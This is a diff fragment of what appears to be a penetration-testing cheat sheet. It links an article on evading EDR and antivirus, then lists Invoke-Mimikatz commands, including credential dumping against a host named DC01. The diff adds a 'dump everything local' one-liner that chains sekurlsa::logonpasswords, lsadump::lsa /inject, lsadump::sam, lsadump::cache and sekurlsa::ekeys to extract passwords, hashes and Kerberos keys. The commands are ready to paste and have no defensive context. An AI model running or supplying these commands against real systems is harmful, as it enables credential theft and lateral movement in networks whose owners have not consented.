@@ -344,11 +344,19 @@ https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invok
 
 * * *
 
+* * *
+
 ```. ./Invoke-Mimikatz.ps1```
 
 ```Invoke-Mimikatz -ComputerName DC01```
 
 ```Invoke-Mimikatz -ComputerName DC01 -DumpCreds```
+
+Dump everything local in a pinch:
+
+```
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
+```
 
 When invoking command make sure to wrap in double AND single quotes - 
 
